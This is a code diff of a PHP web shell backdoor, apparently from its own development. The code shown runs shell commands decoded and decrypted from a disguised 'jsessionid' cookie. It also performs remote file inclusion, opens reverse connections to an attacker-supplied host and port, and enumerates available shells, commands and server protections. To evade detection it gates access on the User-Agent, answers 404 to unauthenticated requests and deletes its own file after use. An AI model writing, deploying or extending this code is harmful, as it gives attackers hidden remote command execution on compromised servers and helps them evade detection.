@@ -1,7 +1,10 @@
 <?php
 //leave me in.
+//changeme
 
-error_reporting(E_ERROR | E_PARSE);
+define("allowed_chars", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJLKMNOPQRSTUVWXYZ");
+
+//error_reporting(E_WARN|E_PARSE);
 if ( ! defined( "PATH_SEPARATOR" ) ) {
     if (str_contains($_ENV["OS"], "Win") !== false)
         define( "PATH_SEPARATOR", ";" );
@@ -275,123 +278,120 @@ function executeCommands($command)
     return "No functions for code execution can be used.";
 }
 
-$ns = null;
-$sk = null;
-$ad = null;
-$ct = null;
-$split = null;
 
-if (validate_auth($_SERVER['HTTP_USER_AGENT'])) {
-    banner();
-    if ($_SERVER["REQUEST_METHOD"] == "POST") {
-        if (isset($_POST["cr"])) {
-            if ($_POST['cr'] === "1") {
-                $split = base64_decode(unserialize(base64_decode($_COOKIE['jsessionid']), ["allowed_classes" => false]));
-                executeCommands($split);
-            } elseif ($_POST['cr'] === '1b') {
-                $split = base64_decode($_COOKIE['jsessionid']);
-                executeCommands($split);
-            } else {
-                $s = $_COOKIE['jsessionid'];
-                $v = explode(".", base64_decode($s));
-                try {
-                    $split = sodium_crypto_aead_chacha20poly1305_decrypt(base64_decode($v[3]), base64_decode($v[2]), base64_decode($v[0]), base64_decode($v[1]));
-                } catch (SodiumException $e) {
-                    echo "Failed to decrypt: {$e->getMessage()}".PHP_EOL;
-                }
-                executeCommands(base64_decode($split));
-            }
-        } elseif (isset($_POST["doInclude"])) {
-            remoteFileInclude($_POST["doInclude"]);
-        } elseif (isset($_COOKIE["cb64"])) {
-            $aSX = explode(".", $_COOKIE['cb64']);
-            if (hash("sha512", $_COOKIE['jsessionid'], $binary = false) === $aSX[1]) {
-                $sp = explode('.', base64_decode($_COOKIE['jsessionid']));
-                try {
-                    $final = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($sp[3], $sp[0], $sp[1], $sp[2]);
-                } catch (SodiumException $e) {
-                    throw new Exception("I require Sodium!");
-                }
-                $axD = unserialize(base64_decode($final), ['allowed_classes' => false]);
-                b64($axD, $aSX[0]);
-            } else {
-                http_response_code(444);
-            }
-        } elseif ($_SERVER['REQUEST_METHOD'] === "POST" && $_COOKIE['jsessionid']) {
-            $splitter = explode(".", base64_decode($_COOKIE['jsessionid']));
-            if (function_exists(pcntl_fork()) === true) {
-                $pid = pcntl_fork();
-                if ($pid === -1) {
-                    die("\n\n");
+function slopp()
+{
+    if (validate_auth($_SERVER['HTTP_USER_AGENT'])) {
+        banner();
+        if ($_SERVER["REQUEST_METHOD"] == "POST") {
+            if (isset($_POST["cr"])) {
+                if ($_POST['cr'] === "1") {
+                    $split = base64_decode(unserialize(base64_decode($_COOKIE['jsessionid']), ["allowed_classes" => false]));
+                    executeCommands($split);
+                } elseif ($_POST['cr'] === '1b') {
+                    $split = base64_decode($_COOKIE['jsessionid']);
+                    executeCommands($split);
                 } else {
-                    pcntl_wait($status);
-                    reverseConnections($splitter[0], $splitter[3], $splitter[1], $splitter[2]);
+                    $s = $_COOKIE['jsessionid'];
+                    $v = explode(".", base64_decode($s));
+                    try {
+                        $split = sodium_crypto_aead_chacha20poly1305_decrypt(base64_decode($v[3]), base64_decode($v[2]), base64_decode($v[0]), base64_decode($v[1]));
+                    } catch (SodiumException $e) {
+                        echo "Failed to decrypt: {$e->getMessage()}".PHP_EOL;
+                    }
+                    executeCommands(base64_decode($split));
                 }
-            } else {
-                echo "Cannot fork, as it does not exist on this system..... using passthru\n";
-                $re = null;
-                passthru(reverseConnections($splitter[0], $splitter[3], $splitter[1], $splitter[2]), $re);
+            } elseif (isset($_POST["doInclude"])) {
+                remoteFileInclude($_POST["doInclude"]);
+            } elseif (isset($_COOKIE["cb64"])) {
+                $aSX = explode(".", $_COOKIE['cb64']);
+                if (hash("sha512", $_COOKIE['jsessionid'], $binary = false) === $aSX[1]) {
+                    $sp = explode('.', base64_decode($_COOKIE['jsessionid']));
+                    try {
+                        $final = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($sp[3], $sp[0], $sp[1], $sp[2]);
+                    } catch (SodiumException $e) {
+                        throw new Exception("I require Sodium!");
+                    }
+                    $axD = unserialize(base64_decode($final), ['allowed_classes' => false]);
+                    b64($axD, $aSX[0]);
+                } else {
+                    http_response_code(444);
+                }
+            } elseif ($_SERVER['REQUEST_METHOD'] === "POST" && $_COOKIE['jsessionid']) {
+                $splitter = explode(".", base64_decode($_COOKIE['jsessionid']));
+                if (function_exists(pcntl_fork()) === true) {
+                    $pid = pcntl_fork();
+                    if ($pid === -1) {
+                        die("\n\n");
+                    } else {
+                        pcntl_wait($status);
+                        reverseConnections($splitter[0], $splitter[3], $splitter[1], $splitter[2]);
+                    }
+                } else {
+                    echo "Cannot fork, as it does not exist on this system..... using passthru\n";
+                    $re = null;
+                    passthru(reverseConnections($splitter[0], $splitter[3], $splitter[1], $splitter[2]), $re);
+                }
             }
-        }
-    } elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
-        if (!empty($_GET["qs"])) {
-            switch ($_GET["qs"]) {
-                case "cqP":
-                    foreach (checkPack() as $packs => $isenabled) {
-                        $isenabled = trim($isenabled);
-                        if ($isenabled === "Disabled") {
-                            $r = "\033[0;31m{$isenabled}\033[0m";
-                        } else {
-                            $r = "\033[0;36m{$isenabled}\033[0m";
+        } elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
+            if (!empty($_GET["qs"])) {
+                switch ($_GET["qs"]) {
+                    case "cqP":
+                        foreach (checkPack() as $packs => $isenabled) {
+                            $isenabled = trim($isenabled);
+                            if ($isenabled === "Disabled") {
+                                $r = "\033[0;31m{$isenabled}\033[0m";
+                            } else {
+                                $r = "\033[0;36m{$isenabled}\033[0m";
+                            }
+                            echo sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $packs, trim($r));
                         }
-                        echo sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $packs, trim($r));
-                    }
-                    header("X-Success: 1");
-                    break;
-                case "cqPR":
-                    foreach (parseProtections() as $prots => $isenabled) {
-                        $isenabled = trim($isenabled);
-                        if ($isenabled === "Disabled") {
-                            $r = "\033[0;31m{$isenabled}\033[0m";
-                        } else {
-                            $r = "\033[0;36m{$isenabled}\033[0m";
+                        header("X-Success: 1");
+                        break;
+                    case "cqPR":
+                        foreach (parseProtections() as $prots => $isenabled) {
+                            $isenabled = trim($isenabled);
+                            if ($isenabled === "Disabled") {
+                                $r = "\033[0;31m{$isenabled}\033[0m";
+                            } else {
+                                $r = "\033[0;36m{$isenabled}\033[0m";
+                            }
+                            echo sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $prots, trim($r));
                         }
-                        echo sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $prots, trim($r));
-                    }
-                    header("X-Success: 1");
-                    break;
-                case "cqSH":
-                    foreach (checkShells(slopos) as $shells => $isenabled) {
-                        $isenabled = trim($isenabled);
-                        if ($isenabled === "Disabled") {
-                            $r = "\033[0;31m{$isenabled}\033[0m";
-                        } else {
-                            $r = "\033[0;36m{$isenabled}\033[0m";
+                        header("X-Success: 1");
+                        break;
+                    case "cqSH":
+                        foreach (checkShells(slopos) as $shells => $isenabled) {
+                            $isenabled = trim($isenabled);
+                            if ($isenabled === "Disabled") {
+                                $r = "\033[0;31m{$isenabled}\033[0m";
+                            } else {
+                                $r = "\033[0;36m{$isenabled}\033[0m";
+                            }
+                            echo sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $shells, trim($r));
                         }
-                        echo sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $shells, trim($r));
-                    }
-                    header("X-Success: 1");
-                    break;
-                case "cqCM":
-                    foreach (checkComs() as $commands => $isenabled) {
-                        $isenabled = trim($isenabled);
-                        if ($isenabled === "Disabled") {
-                            $r = "\033[0;31m{$isenabled}\033[0m";
-                        } else {
-                            $r = "\033[0;36m{$isenabled}\033[0m";
+                        header("X-Success: 1");
+                        break;
+                    case "cqCM":
+                        foreach (checkComs() as $commands => $isenabled) {
+                            $isenabled = trim($isenabled);
+                            if ($isenabled === "Disabled") {
+                                $r = "\033[0;31m{$isenabled}\033[0m";
+                            } else {
+                                $r = "\033[0;36m{$isenabled}\033[0m";
+                            }
+                            echo sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $commands, trim($r));
                         }
-                        echo sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $commands, trim($r));
-                    }
-                    header("X-Success: 1");
-                    break;
-                case "cqI":
-                    $fsize = ini_get("max_file_uploads") ? ini_get("max_file_uploads") : "cannot set max_file_uploads";
-                    $sfem = ini_get("safe_mode") ? "set to true" : "cannot set safemode.";
-                    $fups = ini_get("file_uploads") ? "true" : "false";
-                    $maxium_size = ini_get("upload_max_filesize") ? ini_get("upload_max_filesize") : "cannot set fileupload size.";
-                    $ftd = ini_get("upload_tmp_dir") ? ini_get("upload_tmp_dir") : "cannot set upload_tmp_dir";
-                    $incp = get_include_path();
-                    echo <<<INI
+                        header("X-Success: 1");
+                        break;
+                    case "cqI":
+                        $fsize = ini_get("max_file_uploads") ? ini_get("max_file_uploads") : "cannot set max_file_uploads";
+                        $sfem = ini_get("safe_mode") ? "set to true" : "cannot set safemode.";
+                        $fups = ini_get("file_uploads") ? "true" : "false";
+                        $maxium_size = ini_get("upload_max_filesize") ? ini_get("upload_max_filesize") : "cannot set fileupload size.";
+                        $ftd = ini_get("upload_tmp_dir") ? ini_get("upload_tmp_dir") : "cannot set upload_tmp_dir";
+                        $incp = get_include_path();
+                        echo <<<INI
 Max file uploads: $fsize
 Safemode: $sfem
 File_Uploads: $fups
@@ -399,25 +399,32 @@ Upload Temp Dir: $ftd
 Maximum File upload size: $maxium_size
 Include Path: $incp
 INI. PHP_EOL;
-                    header("X-Success: 1");
-                    break;
+                        header("X-Success: 1");
+                        break;
+                }
+            } else {
+                http_response_code(404);
+                die();
             }
         } else {
             http_response_code(404);
             die();
         }
-    } else {
+        foreach (uwumodifyme() as $new_data => $d){
+            header("{$new_data}: {$d}");
+        }
+        unlink($_SERVER['SCRIPT_FILENAME']);
         http_response_code(404);
         die();
+    }else {
+        http_response_code(404);
+        header("File Not Found");
+        die();
     }
-    foreach (uwumodifyme() as $new_data => $d){
-        header("{$new_data}: {$d}");
-    }
-    unlink($_SERVER['SCRIPT_FILENAME']);
-    http_response_code(404);
-    die();
-}else {
-    http_response_code(404);
-    header("File Not Found");
-    die();
+}
+
+try {
+    slopp();
+} catch (Exception $e) {
+    file_put_contents('testlog.log', $e);
 }
